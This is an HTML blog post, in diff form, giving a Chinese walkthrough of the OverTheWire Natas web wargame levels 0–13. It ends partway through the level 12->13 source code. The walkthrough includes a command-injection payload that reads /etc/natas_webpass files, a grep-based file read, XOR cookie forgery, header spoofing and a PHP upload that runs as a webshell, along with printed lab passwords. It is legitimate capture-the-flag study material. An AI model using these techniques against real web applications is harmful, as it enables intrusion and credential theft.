@@ -1,0 +1,872 @@
+<!doctype html><html lang=zh>
+<head><meta http-equiv=content-type content="text/html" charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=stylesheet href="/css/tailwind.min.b39a406edef2cbbd2ccee2cbd368a787bfad3ac016440c2b37558902050cf85d.css" integrity="sha256-s5pAbt7yy70szuLL02inh7+tOsAWRAwrN1WJAgUM+F0=">
+<link rel=preconnect href=https://fonts.googleapis.com>
+<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Lora&display=swap" rel=stylesheet>
+<script src=https://kit.fontawesome.com/9cc9e9e3f3.js crossorigin=anonymous></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/docsearch.js@2.6.3/dist/cdn/docsearch.min.css><title>Bandit 靶场练习记录</title>
+</head>
+<body class="flex flex-col">
+<header class="flex fixed bg-white w-full p-4 font-title text-xl border-b"><div class="logo flex-1">
+<a href=/ class=font-title>Forgotten Land</a>
+</div>
+<nav class="flex-initial ml-4">
+<div id=归档 class=inline>
+<a href=/metapages/archive/ class="mx-2 hover:text-blue-200">归档</a>
+</div>
+<div id=分类 class=inline>
+<a href=/categories/ class="mx-2 hover:text-blue-200">分类</a>
+<div class=absolute>
+</div>
+</div>
+<div id=标签 class=inline>
+<a href=/tags/ class="mx-2 hover:text-blue-200">标签</a>
+</div>
+<div id=关于 class=inline>
+<a href=/metapages/about/ class="mx-2 hover:text-blue-200">关于</a>
+</div>
+</nav>
+</header>
+<div class="flex-grow mt-24">
+<div class=flex>
+<div class="md:w-4/5 lg:w-2/3 max-w-screen-lg mx-auto lg:mr-0 p-4 shadow-2xl">
+<h1 class="font-title text-4xl text-center mb-4">Bandit 靶场练习记录</h1>
+<div class="flex justify-center font-mono">
+<div class="mr-6 flex-none">
+<i class="fas fa-calendar mr-1"></i>
+<span>2020-03-26</span>
+</div>
+<div class="mr-6 flex-none">
+<i class="fas fa-clock mr-1"></i>
+<span>阅读时长约 15 分钟</span>
+</div>
+</div>
+<article id=content class="content mb-4 p-4">
+<p>Wargames是OverTheWire社区提供的一个帮助学习安全知识和实践的一个平台，提供了各式各样的项目模块，可以在其中练级基本的安全技能。
+Natas0是其中一个比较基础的模块，主要涉及Web方向的知识。</p>
+<h1 id=level-07>Level 0~7</h1>
+<h2 id=level-0>Level 0:</h2>
+<p>直接查看源代码即可得到密码。
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas0.png alt=natas0></p>
+<h2 id=level-0-1>Level 0->1:</h2>
+<p>不能使用右键，但是可以使用 F12 唤出控制台或者直接在 URL 前加上 <code>view-source:</code>：
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas1.png alt=natas1></p>
+<h2 id=level-1-2>Level 1->2：</h2>
+<p>这个页面没有东西，意思是密码应该在其他地方了。查看源码可以知道这个页面还加载了<strong>files/pixel.png</strong>，那么可以尝试访问一下<strong>files</strong>页面：
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas2.png alt=natas2>
+进入users.txt就可以看到密码。</p>
+<h2 id=level-2-3>Level 2->3:</h2>
+<p>还是说该页没有任何东西，查看源码还能看到他说 Google 也发现不了。提到 Google 意思应该是搜索引擎无法找到，那么就应该看看 <strong>robots.txt</strong>文件，这个文件定义了那些页面可以被搜索引擎收录：
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas3.png alt=natas3>
+可以看到有一个 <strong>/s3cr3t/</strong> 是禁止搜索引擎访问的，查看该地址可以看到有一个 <strong>users.txt</strong> 文件，访问就能得到natas4 的密码。</p>
+<h2 id=level-3-4>Level 3->4:</h2>
+<p>提示访问被禁止，用户必须来自 <strong>&ldquo;<a href=http://natas5.natas.labs.overthewire.org/%22>http://natas5.natas.labs.overthewire.org/"</a></strong>，服务器是根据请求头中的 Referer 来判断来源的，所以我们可以修改请求头中的 Referer 来伪造来源：
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas4.png alt=natas4></p>
+<h2 id=level-4-5>Level 4->5:</h2>
+<p>提示没有登陆，登录信息一般是与 cookie 相关的，那就看看吧：
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas5.png alt=natas5>
+可以看到cookie中设置了登录为0，那么把它改为1应该就行了：
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas5-2.png alt=natas5-2>
+这次返回的页面中就有了密码。</p>
+<h2 id=level-5-6>Level 5->6:</h2>
+<p>只给了一个输入框，查看源码可以看到一段PHP代码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span>
+
+<span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;includes/secret.inc&#34;</span>;
+
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;submit&#34;</span>, $_POST)) {
+        <span style=color:#66d9ef>if</span>($secret <span style=color:#f92672>==</span> $_POST[<span style=color:#e6db74>&#39;secret&#39;</span>]) {
+        <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Access granted. The password for natas7 is &lt;censored&gt;&#34;</span>;
+    } <span style=color:#66d9ef>else</span> {
+        <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Wrong secret&#34;</span>;
+    }
+    }
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>简单来说如果判断我们提交的值与 <strong>$secret</strong> 变量相等就可以显示密码，而这个值是在 <strong>secret.inc</strong> 中定义的，那我们访问一下这个文件试试，发现可以访问，并且直接给出了 <strong>$secret</strong> 的值：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span>
+$secret <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;FOEIUWGHFEEUHOFUOIU&#34;</span>;
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>那么直接输入这个值就可以获得密码了。</p>
+<h2 id=level-6-7>Level 6->7:</h2>
+<p>查看源码，告诉了我们密码的位置，在 URL 中，将 page 的参数换成位置就可以直接获得flag。</p>
+<h1 id=level-711>Level 7~11</h1>
+<h2 id=level-7-8>Level 7->8:</h2>
+<p>又让输入，还是先看看给的源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span>
+
+$encodedSecret <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;3d3d516343746d4d6d6c315669563362&#34;</span>;
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>encodeSecret</span>($secret) {
+    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>bin2hex</span>(<span style=color:#a6e22e>strrev</span>(<span style=color:#a6e22e>base64_encode</span>($secret)));
+}
+
+<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;submit&#34;</span>, $_POST)) {
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>encodeSecret</span>($_POST[<span style=color:#e6db74>&#39;secret&#39;</span>]) <span style=color:#f92672>==</span> $encodedSecret) {
+    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Access granted. The password for natas9 is &lt;censored&gt;&#34;</span>;
+    } <span style=color:#66d9ef>else</span> {
+    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Wrong secret&#34;</span>;
+    }
+}
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>给出了加密后的变量和加密的方式，那么将这个过程逆向一遍即可得到密码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+
+$encodedSecret <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;3d3d516343746d4d6d6c315669563362&#34;</span>;
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>decodeSecret</span>($secret) {
+	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>base64_decode</span>(<span style=color:#a6e22e>strrev</span>(<span style=color:#a6e22e>hex2bin</span>($secret)));
+}
+
+<span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>decodeSecret</span>($encodedSecret);
+<span style=color:#75715e>// oubWYf2kBq
+</span><span style=color:#75715e></span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>输入即可得到密码。</p>
+<h2 id=level-8-9>Level 8-9：</h2>
+<p>还是先看看源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span>
+$key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+
+<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;needle&#34;</span>, $_REQUEST)) {
+    $key <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#34;needle&#34;</span>];
+}
+
+<span style=color:#66d9ef>if</span>($key <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) {
+    <span style=color:#a6e22e>passthru</span>(<span style=color:#e6db74>&#34;grep -i </span><span style=color:#e6db74>$key</span><span style=color:#e6db74> dictionary.txt&#34;</span>);
+}
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>一开始以为密码在这个字典里，但是发现没有，他就只是个字典，于是考虑其他方面。可以看到源码这里使用的 <strong>pathru</strong> 这个函数，我们先看这个函数是干什么用的：</p>
+<blockquote>
+<p>同 exec() 函数类似， passthru() 函数也是用来执行外部命令（command）的。当所执行的 Unix 命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代 exec() 或 system() 函数。常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。通过设置 Content-type 为 image/gif，然后调用 pbmplus 程序输出 gif 文件，就可以从 PHP 脚本中直接输出图像到浏览器。</p>
+</blockquote>
+<p>简单来说，这个函数可以执行命令。所以这道题考的是命令执行，就简单了，先办法执行命令读取密码，根据规定， All passwords are also stored in /etc/natas_webpass/，我们应该想办法读取这个文件夹下的 <strong>natas10</strong> 文件，因此构造payload：
+<code>;cat /etc/natas_webpass/natas10;</code>
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</p>
+<h2 id=level-9-10>Level 9->10:</h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span>
+$key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+
+<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;needle&#34;</span>, $_REQUEST)) {
+    $key <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#34;needle&#34;</span>];
+}
+
+<span style=color:#66d9ef>if</span>($key <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) {
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/[;|&amp;]/&#39;</span>,$key)) {
+        <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Input contains an illegal character!&#34;</span>;
+    } <span style=color:#66d9ef>else</span> {
+        <span style=color:#a6e22e>passthru</span>(<span style=color:#e6db74>&#34;grep -i </span><span style=color:#e6db74>$key</span><span style=color:#e6db74> dictionary.txt&#34;</span>);
+    }
+}
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>和上题一样，但是多了过滤。可以选择绕过这个过滤，或者还有其他方法。注意到 grep 也是可以读取文件的，那我们直接将输入作为文件名同样可以达到目的：
+<code>[a-z] /etc/natas_webpass/natas11</code></p>
+<h2 id=level-10-11>Level 10->11:</h2>
+<p>提示使用的异或加密，还是先看看源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span>
+
+$defaultdata <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>( <span style=color:#e6db74>&#34;showpassword&#34;</span><span style=color:#f92672>=&gt;</span><span style=color:#e6db74>&#34;no&#34;</span>, <span style=color:#e6db74>&#34;bgcolor&#34;</span><span style=color:#f92672>=&gt;</span><span style=color:#e6db74>&#34;#ffffff&#34;</span>);
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>xor_encrypt</span>($in) {
+    $key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;censored&gt;&#39;</span>;
+    $text <span style=color:#f92672>=</span> $in;
+    $outText <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
+
+    <span style=color:#75715e>// Iterate through each character
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>for</span>($i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;$i<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>strlen</span>($text);$i<span style=color:#f92672>++</span>) {
+    $outText <span style=color:#f92672>.=</span> $text[$i] <span style=color:#f92672>^</span> $key[$i <span style=color:#f92672>%</span> <span style=color:#a6e22e>strlen</span>($key)];
+    }
+
+    <span style=color:#66d9ef>return</span> $outText;
+}
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>loadData</span>($def) {
+    <span style=color:#66d9ef>global</span> $_COOKIE;
+    $mydata <span style=color:#f92672>=</span> $def;
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;data&#34;</span>, $_COOKIE)) {
+    $tempdata <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_decode</span>(<span style=color:#a6e22e>xor_encrypt</span>(<span style=color:#a6e22e>base64_decode</span>($_COOKIE[<span style=color:#e6db74>&#34;data&#34;</span>])), <span style=color:#66d9ef>true</span>);
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_array</span>($tempdata) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;showpassword&#34;</span>, $tempdata) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;bgcolor&#34;</span>, $tempdata)) {
+        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^#(?:[a-f\d]{6})$/i&#39;</span>, $tempdata[<span style=color:#e6db74>&#39;bgcolor&#39;</span>])) {
+        $mydata[<span style=color:#e6db74>&#39;showpassword&#39;</span>] <span style=color:#f92672>=</span> $tempdata[<span style=color:#e6db74>&#39;showpassword&#39;</span>];
+        $mydata[<span style=color:#e6db74>&#39;bgcolor&#39;</span>] <span style=color:#f92672>=</span> $tempdata[<span style=color:#e6db74>&#39;bgcolor&#39;</span>];
+        }
+    }
+    }
+    <span style=color:#66d9ef>return</span> $mydata;
+}
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>saveData</span>($d) {
+    <span style=color:#a6e22e>setcookie</span>(<span style=color:#e6db74>&#34;data&#34;</span>, <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>xor_encrypt</span>(<span style=color:#a6e22e>json_encode</span>($d))));
+}
+
+$data <span style=color:#f92672>=</span> <span style=color:#a6e22e>loadData</span>($defaultdata);
+
+<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;bgcolor&#34;</span>,$_REQUEST)) {
+    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^#(?:[a-f\d]{6})$/i&#39;</span>, $_REQUEST[<span style=color:#e6db74>&#39;bgcolor&#39;</span>])) {
+        $data[<span style=color:#e6db74>&#39;bgcolor&#39;</span>] <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#39;bgcolor&#39;</span>];
+    }
+}
+
+<span style=color:#a6e22e>saveData</span>($data);
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010>&lt;?
+</span><span style=color:#960050;background-color:#1e0010>if($data[&#34;showpassword&#34;] == &#34;yes&#34;) {
+</span><span style=color:#960050;background-color:#1e0010>    print &#34;The password for natas12 is &lt;censored&gt;&lt;br&gt;&#34;;
+</span><span style=color:#960050;background-color:#1e0010>}
+</span><span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010>?&gt;
+</span></code></pre></div><p>源码最后表示如果 <strong>showpassword</strong> 为 yes 就显示密码，所以要想办法是这个条件成立。分析源码，showpassword 可以在 loadData 中改变，改变的方法是设置 cookie 中的键值，但是 cookie 是加密过的，所以我们还是要对 cookie 解密，解密就需要关注 xor_encrypt 算法了，可以看到其中是有一个 key 的，那么我们首先要解决的是这个 key 的值是什么。到此，思路就明确了。
+对于 xor 来说，如果将密文和明文进行 xor 运算，就可以得到加密用的 key，而这里我们刚好有一组密文（cookie）和明文（defaultdata）。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>$miwen <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_decode</span>(<span style=color:#e6db74>&#34;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#34;</span>);
+$mingwen <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_encode</span>($defaultdata);
+$key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
+<span style=color:#66d9ef>for</span>($i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;$i<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>strlen</span>($miwen);$i<span style=color:#f92672>++</span>) {
+	$key <span style=color:#f92672>.=</span> $miwen[$i] <span style=color:#f92672>^</span> $mingwen[$i];
+}
+<span style=color:#66d9ef>echo</span> $key;
+
+<span style=color:#a6e22e>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</span>
+</code></pre></div><p>于是可以得到 key 是 <strong>qw8J</strong>，接着，需要对伪造的键值对进行加密。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#75715e>// 将 key 和 defalutdata 替换echo base64_encode(xor_encrypt(json_encode($defaultdata)));ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+</span></code></pre></div><p>然后在 cookie 中相应的 data 字段改为这个就可以在重新返回的包中得到密码了：
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas11.png alt=natas11></p>
+<h1 id=level-1117>Level 11~17</h1>
+<h2 id=level-11-12>Level 11->12：</h2>
+<p>这次上传文件了，随便上传一个文件后发现文件名和后缀命都被更改了，文件名不重要，但是扩展名如果被改成了 jpg 那就没办法执行了。查看源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span> 
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>genRandomString</span>() {
+    $length <span style=color:#f92672>=</span> <span style=color:#ae81ff>10</span>;
+    $characters <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0123456789abcdefghijklmnopqrstuvwxyz&#34;</span>;
+    $string <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;    
+
+    <span style=color:#66d9ef>for</span> ($p <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $p <span style=color:#f92672>&lt;</span> $length; $p<span style=color:#f92672>++</span>) {
+        $string <span style=color:#f92672>.=</span> $characters[<span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>strlen</span>($characters)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)];
+    }
+
+    <span style=color:#66d9ef>return</span> $string;
+}
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>makeRandomPath</span>($dir, $ext) {
+    <span style=color:#66d9ef>do</span> {
+    $path <span style=color:#f92672>=</span> $dir<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;/&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>genRandomString</span>()<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;.&#34;</span><span style=color:#f92672>.</span>$ext;
+    } <span style=color:#66d9ef>while</span>(<span style=color:#a6e22e>file_exists</span>($path));
+    <span style=color:#66d9ef>return</span> $path;
+}
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>makeRandomPathFromFilename</span>($dir, $fn) {
+    $ext <span style=color:#f92672>=</span> <span style=color:#a6e22e>pathinfo</span>($fn, <span style=color:#a6e22e>PATHINFO_EXTENSION</span>);
+    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>makeRandomPath</span>($dir, $ext);
+}
+
+<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;filename&#34;</span>, $_POST)) {
+    $target_path <span style=color:#f92672>=</span> <span style=color:#a6e22e>makeRandomPathFromFilename</span>(<span style=color:#e6db74>&#34;upload&#34;</span>, $_POST[<span style=color:#e6db74>&#34;filename&#34;</span>]);
+
+
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>filesize</span>($_FILES[<span style=color:#e6db74>&#39;uploadedfile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>]) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1000</span>) {
+        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;File is too big&#34;</span>;
+    } <span style=color:#66d9ef>else</span> {
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>move_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#39;uploadedfile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>], $target_path)) {
+            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;The file &lt;a href=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>$target_path\</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>&gt;</span>$target_path<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>a</span><span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>has</span> <span style=color:#a6e22e>been</span> <span style=color:#a6e22e>uploaded</span><span style=color:#e6db74>&#34;;
+</span><span style=color:#e6db74>        } else{
+</span><span style=color:#e6db74>            echo &#34;</span><span style=color:#a6e22e>There</span> <span style=color:#a6e22e>was</span> <span style=color:#a6e22e>an</span> <span style=color:#a6e22e>error</span> <span style=color:#a6e22e>uploading</span> <span style=color:#a6e22e>the</span> <span style=color:#a6e22e>file</span>, <span style=color:#a6e22e>please</span> <span style=color:#66d9ef>try</span> <span style=color:#a6e22e>again</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#34;;
+</span><span style=color:#e6db74>        }
+</span><span style=color:#e6db74>    }
+</span><span style=color:#e6db74>} else {
+</span><span style=color:#e6db74>?&gt;
+</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>&lt;form enctype=&#34;</span><span style=color:#a6e22e>multipart</span><span style=color:#f92672>/</span><span style=color:#a6e22e>form</span><span style=color:#f92672>-</span><span style=color:#a6e22e>data</span><span style=color:#e6db74>&#34; action=&#34;</span><span style=color:#a6e22e>index</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#e6db74>&#34; method=&#34;</span><span style=color:#a6e22e>POST</span><span style=color:#e6db74>&#34;&gt;
+</span><span style=color:#e6db74>&lt;input type=&#34;</span><span style=color:#a6e22e>hidden</span><span style=color:#e6db74>&#34; name=&#34;</span><span style=color:#a6e22e>MAX_FILE_SIZE</span><span style=color:#e6db74>&#34; value=&#34;</span><span style=color:#ae81ff>1000</span><span style=color:#e6db74>&#34; /&gt;
+</span><span style=color:#e6db74>&lt;input type=&#34;</span><span style=color:#a6e22e>hidden</span><span style=color:#e6db74>&#34; name=&#34;</span><span style=color:#a6e22e>filename</span><span style=color:#e6db74>&#34; value=&#34;</span><span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>print</span> <span style=color:#a6e22e>genRandomString</span>(); <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>.jpg&#34; /&gt;
+</span><span style=color:#960050;background-color:#1e0010>Choose a JPEG to upload (max 1KB):&lt;br/&gt;
+</span><span style=color:#960050;background-color:#1e0010>&lt;input name=&#34;uploadedfile&#34; type=&#34;file&#34; /&gt;&lt;br /&gt;
+</span><span style=color:#960050;background-color:#1e0010>&lt;input type=&#34;submit&#34; value=&#34;Upload File&#34; /&gt;
+</span><span style=color:#960050;background-color:#1e0010>&lt;/form&gt;
+</span><span style=color:#960050;background-color:#1e0010>&lt;? } ?&gt;
+</span></code></pre></div><p>分成两部分，上边的部分主要是在表示了文件被存储的流程，大概就是随机生成一个字符串，然后将文件放在那里。这里注意到 <code>makeRandomPathFromFilename</code> 中是有看出文件的扩展名是根据文件本身确定的，而保存过程也没有其他函数影响扩展名，所以文件扩展名应该是在上传到服务器之前就被改名了。
+所以关注第二部分&ndash;表单，很容易发现，我们的文件名是在这里被设置的，那么就简单了：抓包该名称或者直接将这个表单这一项改掉：
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas12.png alt=natas12>
+这时再上传文件发现扩展名已经为 php 了，那么接下来就简单了，可以直接读取密码，也可以使用菜刀等连接。</p>
+<h2 id=level-12-13>Level 12->13:</h2>
+<p>仍然是文件上传，但是题目说只接受图片，那就应该是有检测了：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;filename&#34;</span>, $_POST)) {    $target_path <span style=color:#f92672>=</span> <span style=color:#a6e22e>makeRandomPathFromFilename</span>(<span style=color:#e6db74>&#34;upload&#34;</span>, $_POST[<span style=color:#e6db74>&#34;filename&#34;</span>]);        $err<span style=color:#f92672>=</span>$_FILES[<span style=color:#e6db74>&#39;uploadedfile&#39;</span>][<span style=color:#e6db74>&#39;error&#39;</span>];    <span style=color:#66d9ef>if</span>($err){        <span style=color:#66d9ef>if</span>($err <span style=color:#f92672>===</span> <span style=color:#ae81ff>2</span>){            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;The uploaded file exceeds MAX_FILE_SIZE&#34;</span>;        } <span style=color:#66d9ef>else</span>{            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Something went wrong :/&#34;</span>;        }    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>filesize</span>($_FILES[<span style=color:#e6db74>&#39;uploadedfile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>]) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1000</span>) {        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;File is too big&#34;</span>;    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span> <span style=color:#a6e22e>exif_imagetype</span>($_FILES[<span style=color:#e6db74>&#39;uploadedfile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>])) {        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;File is not an image&#34;</span>;    } <span style=color:#66d9ef>else</span> {        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>move_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#39;uploadedfile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>], $target_path)) {            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;The file &lt;a href=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>$target_path\</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>&gt;</span>$target_path<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>a</span><span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>has</span> <span style=color:#a6e22e>been</span> <span style=color:#a6e22e>uploaded</span><span style=color:#e6db74>&#34;;        } else{            echo &#34;</span><span style=color:#a6e22e>There</span> <span style=color:#a6e22e>was</span> <span style=color:#a6e22e>an</span> <span 